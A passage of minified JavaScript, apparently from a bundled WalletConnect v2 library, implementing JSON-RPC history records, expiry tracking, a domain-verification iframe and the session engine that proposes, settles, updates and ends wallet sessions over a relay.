this.core.crypto.decode(t,r);try{n_(n)?(this.core.history.set(t,n),this.onRelayEventRequest({topic:t,payload:n})):Dv(n)&&(await this.core.history.resolve(n),await this.onRelayEventResponse({topic:t,payload:n}),this.core.history.delete(t,n.id))}catch(e){this.logger.error(e)}}))}registerExpirerEvents(){this.core.expirer.on(Rs.expired,(async e=>{const{topic:t}=rI(e.target);t&&this.pairings.keys.includes(t)&&(await this.deletePairing(t,!0),this.events.emit(_d.expire,{topic:t}))}))}}class ZZ extends FG{constructor(e,t){super(e,t),this.core=e,this.logger=t,this.records=new Map,this.events=new ai.EventEmitter,this.name=AZ,this.version=IZ,this.cached=[],this.initialized=!1,this.storagePrefix=Dc,this.init=async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach((e=>this.records.set(e.id,e))),this.cached=[],this.registerEventListeners(),this.initialized=!0)},this.set=(e,t,r)=>{if(this.isInitialized(),this.logger.debug("Setting JSON-RPC request history record"),this.logger.trace({type:"method",method:"set",topic:e,request:t,chainId:r}),this.records.has(t.id))return;const n={id:t.id,topic:e,request:{method:t.method,params:t.params||null},chainId:r,expiry:uo(rt.THIRTY_DAYS)};this.records.set(n.id,n),this.events.emit(No.created,n)},this.resolve=async e=>{if(this.isInitialized(),this.logger.debug("Updating JSON-RPC response history record"),this.logger.trace({type:"method",method:"update",response:e}),!this.records.has(e.id))return;const t=await this.getRecord(e.id);typeof t.response>"u"&&(t.response=fo(e)?{error:e.error}:{result:e.result},this.records.set(t.id,t),this.events.emit(No.updated,t))},this.get=async(e,t)=>(this.isInitialized(),this.logger.debug("Getting record"),this.logger.trace({type:"method",method:"get",topic:e,id:t}),await this.getRecord(t)),this.delete=(e,t)=>{this.isInitialized(),this.logger.debug("Deleting record"),this.logger.trace({type:"method",method:"delete",id:t}),this.values.forEach((r=>{if(r.topic===e){if(typeof t<"u"&&r.id!==t)return;this.records.delete(r.id),this.events.emit(No.deleted,r)}}))},this.exists=async(e,t)=>(this.isInitialized(),!!this.records.has(t)&&(await this.getRecord(t)).topic===e),this.on=(e,t)=>{this.events.on(e,t)},this.once=(e,t)=>{this.events.once(e,t)},this.off=(e,t)=>{this.events.off(e,t)},this.removeListener=(e,t)=>{this.events.removeListener(e,t)},this.logger=nr.generateChildLogger(t,this.name)}get context(){return nr.getLoggerContext(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get size(){return this.records.size}get keys(){return Array.from(this.records.keys())}get values(){return Array.from(this.records.values())}get pending(){const e=[];return this.values.forEach((t=>{if(typeof t.response<"u")return;const r={topic:t.topic,request:lf(t.request.method,t.request.params,t.id),chainId:t.chainId};return e.push(r)})),e}async setJsonRpcRecords(e){await this.core.storage.setItem(this.storageKey,e)}async getJsonRpcRecords(){return await this.core.storage.getItem(this.storageKey)}getRecord(e){this.isInitialized();const t=this.records.get(e);if(!t){const{message:t}=je("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(t)}return t}async persist(){await this.setJsonRpcRecords(this.values),this.events.emit(No.sync)}async restore(){try{const e=await this.getJsonRpcRecords();if(typeof e>"u"||!e.length)return;if(this.records.size){const{message:e}=je("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(e),new Error(e)}this.cached=e,this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",records:this.values})}catch(e){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(e)}}registerEventListeners(){this.events.on(No.created,(e=>{const t=No.created;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,record:e}),this.persist()})),this.events.on(No.updated,(e=>{const t=No.updated;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,record:e}),this.persist()})),this.events.on(No.deleted,(e=>{const t=No.deleted;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,record:e}),this.persist()})),this.core.heartbeat.on(lh.HEARTBEAT_EVENTS.pulse,(()=>{this.cleanup()}))}cleanup(){try{this.records.forEach((e=>{rt.toMiliseconds(e.expiry||0)-Date.now()<=0&&(this.logger.info(`Deleting expired history log: ${e.id}`),this.delete(e.topic,e.id))}))}catch(e){this.logger.warn(e)}}isInitialized(){if(!this.initialized){const{message:e}=je("NOT_INITIALIZED",this.name);throw new Error(e)}}}class QZ extends qG{constructor(e,t){super(e,t),this.core=e,this.logger=t,this.expirations=new Map,this.events=new ai.EventEmitter,this.name=RZ,this.version=TZ,this.cached=[],this.initialized=!1,this.storagePrefix=Dc,this.init=async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach((e=>this.expirations.set(e.target,e))),this.cached=[],this.registerEventListeners(),this.initialized=!0)},this.has=e=>{try{const t=this.formatTarget(e);return typeof this.getExpiration(t)<"u"}catch{return!1}},this.set=(e,t)=>{this.isInitialized();const r=this.formatTarget(e),n={target:r,expiry:t};this.expirations.set(r,n),this.checkExpiry(r,n),this.events.emit(Rs.created,{target:r,expiration:n})},this.get=e=>{this.isInitialized();const t=this.formatTarget(e);return this.getExpiration(t)},this.del=e=>{if(this.isInitialized(),this.has(e)){const t=this.formatTarget(e),r=this.getExpiration(t);this.expirations.delete(t),this.events.emit(Rs.deleted,{target:t,expiration:r})}},this.on=(e,t)=>{this.events.on(e,t)},this.once=(e,t)=>{this.events.once(e,t)},this.off=(e,t)=>{this.events.off(e,t)},this.removeListener=(e,t)=>{this.events.removeListener(e,t)},this.logger=nr.generateChildLogger(t,this.name)}get context(){return nr.getLoggerContext(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.expirations.size}get keys(){return Array.from(this.expirations.keys())}get values(){return Array.from(this.expirations.values())}formatTarget(e){if("string"==typeof e)return iV(e);if("number"==typeof e)return sV(e);const{message:t}=je("UNKNOWN_TYPE","Target type: "+typeof e);throw new Error(t)}async setExpirations(e){await this.core.storage.setItem(this.storageKey,e)}async getExpirations(){return await this.core.storage.getItem(this.storageKey)}async persist(){await this.setExpirations(this.values),this.events.emit(Rs.sync)}async restore(){try{const e=await this.getExpirations();if(typeof e>"u"||!e.length)return;if(this.expirations.size){const{message:e}=je("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(e),new Error(e)}this.cached=e,this.logger.debug(`Successfully Restored expirations for ${this.name}`),this.logger.trace({type:"method",method:"restore",expirations:this.values})}catch(e){this.logger.debug(`Failed to Restore expirations for ${this.name}`),this.logger.error(e)}}getExpiration(e){const t=this.expirations.get(e);if(!t){const{message:t}=je("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.error(t),new Error(t)}return t}checkExpiry(e,t){const{expiry:r}=t;rt.toMiliseconds(r)-Date.now()<=0&&this.expire(e,t)}expire(e,t){this.expirations.delete(e),this.events.emit(Rs.expired,{target:e,expiration:t})}checkExpirations(){this.core.relayer.connected&&this.expirations.forEach(((e,t)=>this.checkExpiry(t,e)))}registerEventListeners(){this.core.heartbeat.on(lh.HEARTBEAT_EVENTS.pulse,(()=>this.checkExpirations())),this.events.on(Rs.created,(e=>{const t=Rs.created;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),this.persist()})),this.events.on(Rs.expired,(e=>{const t=Rs.expired;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),this.persist()})),this.events.on(Rs.deleted,(e=>{const t=Rs.deleted;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),this.persist()}))}isInitialized(){if(!this.initialized){const{message:e}=je("NOT_INITIALIZED",this.name);throw new Error(e)}}}class YZ extends VG{constructor(e,t){super(e,t),this.projectId=e,this.logger=t,this.name=Dw,this.initialized=!1,this.queue=[],this.verifyDisabled=!1,this.init=async()=>{if(this.verifyDisabled||M0()||!k0())return;const e=Y1;this.verifyUrl!==e&&this.removeIframe(),this.verifyUrl=e;try{await this.createIframe()}catch(e){this.logger.info(`Verify iframe failed to load: ${this.verifyUrl}`),this.logger.info(e)}if(!this.initialized){this.removeIframe(),this.verifyUrl=Rx;try{await this.createIframe()}catch(e){this.logger.info(`Verify iframe failed to load: ${this.verifyUrl}`),this.logger.info(e),this.verifyDisabled=!0}}},this.register=async e=>{this.initialized?this.sendPost(e.attestationId):(this.addToQueue(e.attestationId),await this.init())},this.resolve=async e=>{if(this.isDevEnv)return"";const t=(null==e?void 0:e.verifyUrl)||Y1;let r;try{r=await this.fetchAttestation(e.attestationId,t)}catch(n){this.logger.info(`failed to resolve attestation: ${e.attestationId} from url: ${t}`),this.logger.info(n),r=await this.fetchAttestation(e.attestationId,Rx)}return r},this.fetchAttestation=async(e,t)=>{this.logger.info(`resolving attestation: ${e} from url: ${t}`);const r=this.startAbortTimer(2*rt.ONE_SECOND),n=await fetch(`${t}/attestation/${e}`,{signal:this.abortController.signal});return clearTimeout(r),200===n.status?await n.json():void 0},this.addToQueue=e=>{this.queue.push(e)},this.processQueue=()=>{0!==this.queue.length&&(this.queue.forEach((e=>this.sendPost(e))),this.queue=[])},this.sendPost=e=>{var t;try{if(!this.iframe)return;null==(t=this.iframe.contentWindow)||t.postMessage(e,"*"),this.logger.info(`postMessage sent: ${e} ${this.verifyUrl}`)}catch{}},this.createIframe=async()=>{let e;const t=r=>{"verify_ready"===r.data&&(this.initialized=!0,this.processQueue(),window.removeEventListener("message",t),e())};await Promise.race([new Promise((r=>{if(document.getElementById(Dw))return r();window.addEventListener("message",t);const n=document.createElement("iframe");n.id=Dw,n.src=`${this.verifyUrl}/${this.projectId}`,n.style.display="none",document.body.append(n),this.iframe=n,e=r})),new Promise(((e,r)=>setTimeout((()=>{window.removeEventListener("message",t),r("verify iframe load timeout")}),rt.toMiliseconds(rt.FIVE_SECONDS))))])},this.removeIframe=()=>{this.iframe&&(this.iframe.remove(),this.iframe=void 0,this.initialized=!1)},this.logger=nr.generateChildLogger(t,this.name),this.verifyUrl=Y1,this.abortController=new AbortController,this.isDevEnv=Z3()&&{}.IS_VITEST}get context(){return nr.getLoggerContext(this.logger)}startAbortTimer(e){return this.abortController=new AbortController,setTimeout((()=>this.abortController.abort()),rt.toMiliseconds(e))}}var XZ=Object.defineProperty,$x=Object.getOwnPropertySymbols,eQ=Object.prototype.hasOwnProperty,tQ=Object.prototype.propertyIsEnumerable,Lx=(e,t,r)=>t in e?XZ(e,t,{enumerable:!0,configurable:!0,writable:!0,value:r}):e[t]=r,Bx=(e,t)=>{for(var r in t||(t={}))eQ.call(t,r)&&Lx(e,r,t[r]);if($x)for(var r of $x(t))tQ.call(t,r)&&Lx(e,r,t[r]);return e};class s_ extends BG{constructor(e){super(e),this.protocol=PI,this.version=2,this.name=i_,this.events=new ai.EventEmitter,this.initialized=!1,this.on=(e,t)=>this.events.on(e,t),this.once=(e,t)=>this.events.once(e,t),this.off=(e,t)=>this.events.off(e,t),this.removeListener=(e,t)=>this.events.removeListener(e,t),this.projectId=null==e?void 0:e.projectId,this.relayUrl=(null==e?void 0:e.relayUrl)||kI,this.customStoragePrefix=null!=e&&e.customStoragePrefix?`:${e.customStoragePrefix}`:"";const t=typeof(null==e?void 0:e.logger)<"u"&&"string"!=typeof(null==e?void 0:e.logger)?e.logger:nr.pino(nr.getDefaultLoggerOptions({level:(null==e?void 0:e.logger)||nZ.logger}));this.logger=nr.generateChildLogger(t,this.name),this.heartbeat=new lh.HeartBeat,this.crypto=new OZ(this,this.logger,null==e?void 0:e.keychain),this.history=new ZZ(this,this.logger),this.expirer=new QZ(this,this.logger),this.storage=null!=e&&e.storage?e.storage:new TG(Bx(Bx({},iZ),null==e?void 0:e.storageOptions)),this.relayer=new qZ({core:this,logger:this.logger,relayUrl:this.relayUrl,projectId:this.projectId}),this.pairing=new JZ(this,this.logger),this.verify=new YZ(this.projectId||"",this.logger)}static async init(e){const t=new s_(e);await t.initialize();const r=await t.crypto.getClientId();return await t.storage.setItem(yZ,r),t}get context(){return nr.getLoggerContext(this.logger)}async start(){this.initialized||await this.initialize()}async initialize(){this.logger.trace("Initialized");try{await this.crypto.init(),await this.history.init(),await this.expirer.init(),await this.relayer.init(),await this.heartbeat.init(),await this.pairing.init(),this.initialized=!0,this.logger.info("Core Initialization Success")}catch(e){throw this.logger.warn(`Core Initialization Failure at epoch ${Date.now()}`,e),this.logger.error(e.message),e}}}const rQ=s_,DI="wc",$I=2,LI="client",o_=`${DI}@2:${LI}:`,Lw={name:LI,logger:"error",controller:!1,relayUrl:"wss://relay.walletconnect.com"},Fx="WALLETCONNECT_DEEPLINK_CHOICE",nQ="proposal",BI="Proposal expired",iQ="session",E1=rt.SEVEN_DAYS,sQ="engine",nd={wc_sessionPropose:{req:{ttl:rt.FIVE_MINUTES,prompt:!0,tag:1100},res:{ttl:rt.FIVE_MINUTES,prompt:!1,tag:1101}},wc_sessionSettle:{req:{ttl:rt.FIVE_MINUTES,prompt:!1,tag:1102},res:{ttl:rt.FIVE_MINUTES,prompt:!1,tag:1103}},wc_sessionUpdate:{req:{ttl:rt.ONE_DAY,prompt:!1,tag:1104},res:{ttl:rt.ONE_DAY,prompt:!1,tag:1105}},wc_sessionExtend:{req:{ttl:rt.ONE_DAY,prompt:!1,tag:1106},res:{ttl:rt.ONE_DAY,prompt:!1,tag:1107}},wc_sessionRequest:{req:{ttl:rt.FIVE_MINUTES,prompt:!0,tag:1108},res:{ttl:rt.FIVE_MINUTES,prompt:!1,tag:1109}},wc_sessionEvent:{req:{ttl:rt.FIVE_MINUTES,prompt:!0,tag:1110},res:{ttl:rt.FIVE_MINUTES,prompt:!1,tag:1111}},wc_sessionDelete:{req:{ttl:rt.ONE_DAY,prompt:!1,tag:1112},res:{ttl:rt.ONE_DAY,prompt:!1,tag:1113}},wc_sessionPing:{req:{ttl:rt.THIRTY_SECONDS,prompt:!1,tag:1114},res:{ttl:rt.THIRTY_SECONDS,prompt:!1,tag:1115}}},Bw={min:rt.FIVE_MINUTES,max:rt.SEVEN_DAYS},Aa={idle:"IDLE",active:"ACTIVE"},oQ="request",aQ=["wc_sessionPropose","wc_sessionRequest","wc_authRequest"];var cQ=Object.defineProperty,lQ=Object.defineProperties,uQ=Object.getOwnPropertyDescriptors,jx=Object.getOwnPropertySymbols,fQ=Object.prototype.hasOwnProperty,hQ=Object.prototype.propertyIsEnumerable,Ux=(e,t,r)=>t in e?cQ(e,t,{enumerable:!0,configurable:!0,writable:!0,value:r}):e[t]=r,Di=(e,t)=>{for(var r in t||(t={}))fQ.call(t,r)&&Ux(e,r,t[r]);if(jx)for(var r of jx(t))hQ.call(t,r)&&Ux(e,r,t[r]);return e},id=(e,t)=>lQ(e,uQ(t));class dQ extends KG{constructor(e){super(e),this.name=sQ,this.events=new U3,this.initialized=!1,this.ignoredPayloadTypes=[au],this.requestQueue={state:Aa.idle,queue:[]},this.sessionRequestQueue={state:Aa.idle,queue:[]},this.requestQueueDelay=rt.ONE_SECOND,this.init=async()=>{this.initialized||(await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.registerPairingEvents(),this.client.core.pairing.register({methods:Object.keys(nd)}),this.initialized=!0,setTimeout((()=>{this.sessionRequestQueue.queue=this.getPendingSessionRequests(),this.processSessionRequestQueue()}),rt.toMiliseconds(this.requestQueueDelay)))},this.connect=async e=>{await this.isInitialized();const t=id(Di({},e),{requiredNamespaces:e.requiredNamespaces||{},optionalNamespaces:e.optionalNamespaces||{}});await this.isValidConnect(t);const{pairingTopic:r,requiredNamespaces:n,optionalNamespaces:i,sessionProperties:o,relays:s}=t;let a,c=r,l=!1;if(c&&(l=this.client.core.pairing.pairings.get(c).active),!c||!l){const{topic:e,uri:t}=await this.client.core.pairing.create();c=e,a=t}const u=await this.client.core.crypto.generateKeyPair(),h=Di({requiredNamespaces:n,optionalNamespaces:i,relays:s??[{protocol:MI}],proposer:{publicKey:u,metadata:this.client.metadata}},o&&{sessionProperties:o}),{reject:d,resolve:f,done:p}=Qu(rt.FIVE_MINUTES,BI);if(this.events.once(fn("session_connect"),(async({error:e,session:t})=>{if(e)d(e);else if(t){t.self.publicKey=u;const e=id(Di({},t),{requiredNamespaces:t.requiredNamespaces,optionalNamespaces:t.optionalNamespaces});await this.client.session.set(t.topic,e),await this.setExpiry(t.topic,t.expiry),c&&await this.client.core.pairing.updateMetadata({topic:c,metadata:t.peer.metadata}),f(e)}})),!c){const{message:e}=je("NO_MATCHING_KEY",`connect() pairing topic: ${c}`);throw new Error(e)}const g=await this.sendRequest({topic:c,method:"wc_sessionPropose",params:h}),m=uo(rt.FIVE_MINUTES);return await this.setProposal(g,Di({id:g,expiry:m},h)),{uri:a,approval:p}},this.pair=async e=>(await this.isInitialized(),await this.client.core.pairing.pair(e)),this.approve=async e=>{await this.isInitialized(),await this.isValidApprove(e);const{id:t,relayProtocol:r,namespaces:n,sessionProperties:i}=e,o=this.client.proposal.get(t);let{pairingTopic:s,proposer:a,requiredNamespaces:c,optionalNamespaces:l}=o;s=s||"",cf(c)||(c=yV(n,"approve()"));const u=await this.client.core.crypto.generateKeyPair(),h=a.publicKey,d=await this.client.core.crypto.generateSharedKey(u,h);s&&t&&(await this.client.core.pairing.updateMetadata({topic:s,metadata:a.metadata}),await this.sendResult({id:t,topic:s,result:{relay:{protocol:r??"irn"},responderPublicKey:u}}),await this.client.proposal.delete(t,nn("USER_DISCONNECTED")),await this.client.core.pairing.activate({topic:s}));const f=Di({relay:{protocol:r??"irn"},namespaces:n,requiredNamespaces:c,optionalNamespaces:l,pairingTopic:s,controller:{publicKey:u,metadata:this.client.metadata},expiry:uo(E1)},i&&{sessionProperties:i});await this.client.core.relayer.subscribe(d),await this.sendRequest({topic:d,method:"wc_sessionSettle",params:f,throwOnFailedPublish:!0});const p=id(Di({},f),{topic:d,pairingTopic:s,acknowledged:!1,self:f.controller,peer:{publicKey:a.publicKey,metadata:a.metadata},controller:u});return await this.client.session.set(d,p),await this.setExpiry(d,uo(E1)),{topic:d,acknowledged:()=>new Promise((e=>setTimeout((()=>e(this.client.session.get(d))),500)))}},this.reject=async e=>{await this.isInitialized(),await this.isValidReject(e);const{id:t,reason:r}=e,{pairingTopic:n}=this.client.proposal.get(t);n&&(await this.sendError(t,n,r),await this.client.proposal.delete(t,nn("USER_DISCONNECTED")))},this.update=async e=>{await this.isInitialized(),await this.isValidUpdate(e);const{topic:t,namespaces:r}=e,n=await this.sendRequest({topic:t,method:"wc_sessionUpdate",params:{namespaces:r}}),{done:i,resolve:o,reject:s}=Qu();return this.events.once(fn("session_update",n),(({error:e})=>{e?s(e):o()})),await this.client.session.update(t,{namespaces:r}),{acknowledged:i}},this.extend=async e=>{await this.isInitialized(),await this.isValidExtend(e);const{topic:t}=e,r=await this.sendRequest({topic:t,method:"wc_sessionExtend",params:{}}),{done:n,resolve:i,reject:o}=Qu();return this.events.once(fn("session_extend",r),(({error:e})=>{e?o(e):i()})),await this.setExpiry(t,uo(E1)),{acknowledged:n}},this.request=async e=>{await this.isInitialized(),await this.isValidRequest(e);const{chainId:t,request:r,topic:n,expiry:i}=e,o=t_(),{done:s,resolve:a,reject:c}=Qu(i,"Request expired. Please try again.");return this.events.once(fn("session_request",o),(({error:e,result:t})=>{e?c(e):a(t)})),await Promise.all([new Promise((async e=>{await this.sendRequest({clientRpcId:o,topic:n,method:"wc_sessionRequest",params:{request:r,chainId:t},expiry:i,throwOnFailedPublish:!0}).catch((e=>c(e))),this.client.events.emit("session_request_sent",{topic:n,request:r,chainId:t,id:o}),e()})),new Promise((async e=>{const t=await this.client.core.storage.getItem(Fx);oV({id:o,topic:n,wcDeepLink:t}),e()})),s()]).then((e=>e[2]))},this.respond=async e=>{await this.isInitialized(),await this.isValidRespond(e);const{topic:t,response:r}=e,{id:n}=r;Ra(r)?await this.sendResult({id:n,topic:t,result:r.result,throwOnFailedPublish:!0}):fo(r)&&await this.sendError(n,t,r.error),this.cleanupAfterResponse(e)},this.ping=async e=>{await this.isInitialized(),await this.isValidPing(e);const{topic:t}=e;if(this.client.session.keys.includes(t)){const e=await this.sendRequest({topic:t,method:"wc_sessionPing",params:{}}),{done:r,resolve:n,reject:i}=Qu();this.events.once(fn("session_ping",e),(({error:e})=>{e?i(e):n()})),await r()}else this.client.core.pairing.pairings.keys.includes(t)&&await this.client.core.pairing.ping({topic:t})},this.emit=async e=>{await this.isInitialized(),await this.isValidEmit(e);const{topic:t,event:r,chainId:n}=e;await this.sendRequest({topic:t,method:"wc_sessionEvent",params:{event:r,chainId:n}})},this.disconnect=async e=>{await this.isInitialized(),await this.isValidDisconnect(e);const{topic:t}=e;this.client.session.keys.includes(t)?(await this.sendRequest({topic:t,method:"wc_sessionDelete",params:nn("USER_DISCONNECTED"),throwOnFailedPublish:!0}),await this.deleteSession(t)):await this.client.core.pairing.disconnect({topic:t})},this.find=e=>(this.isInitialized(),this.client.session.getAll().filter((t=>xV(t,e)))),this.getPendingSessionRequests=()=>(this.isInitialized(),this.client.pendingRequest.getAll()),this.cleanupDuplicatePairings=async e=>{if(e.pairingTopic)try{const t=this.client.core.pairing.pairings.get(e.pairingTopic),r=this.client.core.pairing.pairings.getAll().filter((r=>{var n,i;return(null==(n=r.peerMetadata)?void 0:n.url)&&(null==(i=r.peerMetadata)?void 0:i.url)===e.peer.metadata.url&&r.topic&&r.topic!==t.topic}));if(0===r.length)return;this.client.logger.info(`Cleaning up ${r.length} duplicate pairing(s)`),await Promise.all(r.map((e=>this.client.core.pairing.disconnect({topic:e.topic})))),this.client.logger.info("Duplicate pairings clean up finished")}catch(e){this.client.logger.error(e)}},this.deleteSession=async(e,t)=>{const{self:r}=this.client.session.get(e);await this.client.core.relayer.unsubscribe(e),this.client.session.delete(e,nn("USER_DISCONNECTED")),this.client.core.crypto.keychain.has(r.publicKey)&&await this.client.core.crypto.deleteKeyPair(r.publicKey),this.client.core.crypto.keychain.has(e)&&await this.client.core.crypto.deleteSymKey(e),t||this.client.core.expirer.del(e),this.client.core.storage.removeItem(Fx).catch((e=>this.client.logger.warn(e)))},this.deleteProposal=async(e,t)=>{await Promise.all([this.client.proposal.delete(e,nn("USER_DISCONNECTED")),t?Promise.resolve():this.client.core.expirer.del(e)])},this.deletePendingSessionRequest=async(e,t,r=!1)=>{await Promise.all([this.client.pendingRequest.delete(e,t),r?Promise.resolve():this.client.core.expirer.del(e)]),this.sessionRequestQueue.queue=this.sessionRequestQueue.queue.filter((t=>t.id!==e)),r&&(this.sessionRequestQueue.state=Aa.idle)},this.setExpiry=async(e,t)=>{this.client.session.keys.includes(e)&&await this.client.session.update(e,{expiry:t}),this.client.core.expirer.set(e,t)},this.setProposal=async(e,t)=>{await this.client.proposal.set(e,t),this.client.core.expirer.set(e,t.expiry)},this.setPendingSessionRequest=async e=>{const t=nd.wc_sessionRequest.req.ttl,{id:r,topic:n,params:i,verifyContext:o}=e;await this.client.pendingRequest.set(r,{id:r,topic:n,params:i,verifyContext:o}),t&&this.client.core.expirer.set(r,uo(t))},this.sendRequest=async e=>{const{topic:t,method:r,params:n,expiry:i,relayRpcId:o,clientRpcId:s,throwOnFailedPublish:a}=e,c=lf(r,n,s);if(k0()&&aQ.includes(r)){const e=af(JSON.stringify(c));this.client.core.verify.register({attestationId:e})}const l=await this.client.core.crypto.encode(t,c),u=nd[r].req;return i&&(u.ttl=i),o&&(u.id=o),this.client.core.history.set(t,c),a?(u.internal=id(Di({},u.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(t,l,u)):this.client.core.relayer.publish(t,l,u).catch((e=>this.client.logger.error(e))),c.id},this.sendResult=async e=>{const{id:t,topic:r,result:n,throwOnFailedPublish:i}=e,o=r_(t,n),s=await this.client.core.crypto.encode(r,o),a=await this.client.core.history.get(r,t),c=nd[a.request.method].res;i?(c.internal=id(Di({},c.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(r,s,c)):this.client.core.relayer.publish(r,s,c).catch((e=>this.client.logger.error(e))),await this.client.core.history.resolve(o)},this.sendError=async(e,t,r)=>{const n=kv(e,r),i=await this.client.core.crypto.encode(t,n),o=await this.client.core.history.get(t,e),s=nd[o.request.method].res;this.client.core.relayer.publish(t,i,s),await this.client.core.history.resolve(n)},this.cleanup=async()=>{const e=[],t=[];this.client.session.getAll().forEach((t=>{vc(t.expiry)&&e.push(t.topic)})),this.client.proposal.getAll().forEach((e=>{vc(e.expiry)&&t.push(e.id)})),await Promise.all([...e.map((e=>this.deleteSession(e))),...t.map((e=>this.deleteProposal(e)))])},this.onRelayEventRequest=async e=>{this.requestQueue.queue.push(e),await this.processRequestsQueue()},this.processRequestsQueue=async()=>{if(this.requestQueue.state!==Aa.active){for(this.client.logger.info(`Request queue starting with ${this.requestQueue.queue.length} requests`);this.requestQueue.queue.length>0;){this.requestQueue.state=Aa.active;const e=this.requestQueue.queue.shift();if(e)try{this.processRequest(e),await new Promise((e=>setTimeout(e,300)))}catch(e){this.client.logger.warn(e)}}this.requestQueue.state=Aa.idle}else this.client.logger.info("Request queue already active, skipping...")},this.processRequest=e=>{const{topic:t,payload:r}=e,n=r.method;switch(n){case"wc_sessionPropose":return this.onSessionProposeRequest(t,r);case"wc_sessionSettle":return this.onSessionSettleRequest(t,r);case"wc_sessionUpdate":return this.onSessionUpdateRequest(t,r);case"wc_sessionExtend":return this.onSessionExtendRequest(t,r);case"wc_sessionPing":return this.onSessionPingRequest(t,r);case"wc_sessionDelete":return this.onSessionDeleteRequest(t,r);case"wc_sessionRequest":return this.onSessionRequest(t,r);case"wc_sessionEvent":return this.onSessionEventRequest(t,r);default:return this.client.logger.info(`Unsupported request method ${n}`)}},this.onRelayEventResponse=async e=>{const{topic:t,payload:r}=e,n=(await this.client.core.history.get(t,r.id)).request.method;switch(n){case"wc_sessionPropose":return this.onSessionProposeResponse(t,r);case"wc_sessionSettle":return this.onSessionSettleResponse(t,r);case"wc_sessionUpdate":return this.onSessionUpdateResponse(t,r);case"wc_sessionExtend":return this.onSessionExtendResponse(t,r);case"wc_sessionPing":return this.onSessionPingResponse(t,r);case"wc_sessionRequest":return this.onSessionRequestResponse(t,r);default:return this.client.logger.info(`Unsupported response method ${n}`)}},this.onRelayEventUnknownPayload=e=>{const{topic:t}=e,{message:r}=je("MISSING_OR_INVALID",`Decoded payload on topic ${t} is not identifiable as a JSON-RPC request or a response.`);throw new Error(r)},this.onSessionProposeRequest=async(e,t)=>{const{params:r,id:n}=t;try{this.isValidConnect(Di({},t.params));const i=uo(rt.FIVE_MINUTES),o=Di({id:n,pairingTopic:e,expiry:i},r);await this.setProposal(n,o);const s=af(JSON.stringify(t)),a=await this.getVerifyContext(s,o.proposer.metadata);this.client.events.emit("session_proposal",{id:n,params:o,verifyContext:a})}catch(t){await this.sendError(n,e,t),this.client.logger.error(t)}},this.onSessionProposeResponse=async(e,t)=>{const{id:r}=t;if(Ra(t)){const{result:n}=t;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",result:n});const i=this.client.proposal.get(r);this.client.logger.trace({type:"method",method:"onSessionProposeResponse",proposal:i});const o=i.proposer.publicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",selfPublicKey:o});const s=n.responderPublicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",peerPublicKey:s});const a=await this.client.core.crypto.generateSharedKey(o,s);this.client.logger.trace({type:"method",method:"onSessionProposeResponse",sessionTopic:a});const c=await this.client.core.relayer.subscribe(a);this.client.logger.trace({type:"method",method:"onSessionProposeResponse",subscriptionId:c}),await this.client.core.pairing.activate({topic:e})}else fo(t)&&(await this.client.proposal.delete(r,nn("USER_DISCONNECTED")),this.events.emit(fn("session_connect"),{error:t.error}))},this.onSessionSettleRequest=async(e,t)=>{const{id:r,params:n}=t;try{this.isValidSessionSettleRequest(n);const{relay:r,controller:i,expiry:o,namespaces:s,requiredNamespaces:a,optionalNamespaces:c,sessionProperties:l,pairingTopic:u}=t.params,h=Di({topic:e,relay:r,expiry:o,namespaces:s,acknowledged:!0,pairingTopic:u,requiredNamespaces:a,optionalNamespaces:c,controller:i.publicKey,self:{publicKey:"",metadata:this.client.metadata},peer:{publicKey:i.publicKey,metadata:i.metadata}},l&&{sessionProperties:l});await this.sendResult({id:t.id,topic:e,result:!0}),this.events.emit(fn("session_connect"),{session:h}),this.cleanupDuplicatePairings(h)}catch(t){await this.sendError(r,e,t),this.client.logger.error(t)}},this.onSessionSettleResponse=async(e,t)=>{const{id:r}=t;Ra(t)?(await this.client.session.update(e,{acknowledged:!0}),this.events.emit(fn("session_approve",r),{})):fo(t)&&(await this.client.session.delete(e,nn("USER_DISCONNECTED")),this.events.emit(fn("session_approve",r),{error:t.error}))},this.onSessionUpdateRequest=async(e,t)=>{const{params:r,id:n}=t;try{const t=`${e}_session_update`,i=w1.get(t);if(i&&this.isRequestOutOfSync(i,n))return void this.client.logger.info(`Discarding out of sync request - ${n}`);this.isValidUpdate(Di({topic:e},r)),await this.client.session.update(e,{namespaces:r.namespaces}),await this.sendResult({id:n,topic:e,result:!0}),this.client.events.emit("session_update",{id:n,topic:e,params:r}),w1.set(t,n)}catch(t){await this.sendError(n,e,t),this.client.logger.error(t)}},this.isRequestOutOfSync=(e,t)=>parseInt(t.toString().slice(0,-3))<=parseInt(e.toString().slice(0,-3)),this.onSessionUpdateResponse=(e,t)=>{const{id:r}=t;Ra(t)?this.events.emit(fn("session_update",r),{}):fo(t)&&this.events.emit(fn("session_update",r),{error:t.error})},this.onSessionExtendRequest=async(e,t)=>{const{id:r}=t;try{this.isValidExtend({topic:e}),await this.setExpiry(e,uo(E1)),await this.sendResult({id:r,topic:e,result:!0}),this.client.events.emit("session_extend",{id:r,topic:e})}catch(t){await 